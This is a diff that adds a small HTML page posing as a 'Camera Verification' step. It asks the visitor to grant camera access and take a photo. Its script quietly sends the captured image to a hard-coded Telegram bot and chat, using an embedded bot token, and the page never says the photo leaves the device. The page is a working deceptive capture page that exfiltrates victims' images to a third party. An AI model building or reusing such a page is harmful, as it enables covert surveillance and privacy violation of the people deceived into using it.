@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Snap Camera</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body style="background:#000;color:#fff;text-align:center;font-family:sans-serif;">
+  <h2>Camera Verification</h2>
+  <p>Please allow camera access and press the button</p>
+
+  <video id="video" autoplay playsinline style="width:90%;max-width:320px;"></video>
+  <br><br>
+  <button onclick="takePhoto()" style="padding:12px 20px;font-size:18px;">
+    Take Photo
+  </button>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
+const CHAT_ID = "1186294172";
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  document.getElementById("video").srcObject = stream;
+});
+
+function takePhoto() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    });
+  }, "image/jpeg");
+}
+</script>
+</body>
+</html>
